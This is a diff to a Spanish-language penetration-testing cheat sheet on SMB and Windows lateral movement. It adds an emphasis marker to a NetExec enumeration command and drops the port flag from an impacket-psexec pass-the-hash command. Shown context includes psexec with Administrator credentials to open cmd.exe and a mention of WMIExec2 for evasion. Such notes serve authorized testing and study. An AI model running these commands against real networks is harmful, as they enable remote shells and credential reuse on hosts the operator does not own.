@@ -73,7 +73,7 @@ Tags: #SMB #RPC #PsExec #Windows #Enum #Credentials #LateralMovement
 
 ```bash
 # ENUMERACIÓN 
-❯ nxc smb <IP/rango>
+❯ nxc smb <IP/rango>     <- IMPORTANTE
 # Mapear toda la red
 
 ❯ nxc smb <IP/rango> --gen-relay-list relay.txt
@@ -501,7 +501,7 @@ NOTA:
 	- Si no funciona por ``SMB o WinRM`` utilizar ``WMIExec2`` para la evasión y conexión mediante WMI
 
 ```bash
-❯ impacket-psexec -port 445 domain/user@<IP> -hashes :NThash
+❯ impacket-psexec domain/user@<IP> -hashes :NThash
 # Especificar puerto cuando el default falla
 
 ❯ impacket-psexec domain.corp/Administrator:Password@<IP> cmd.exe
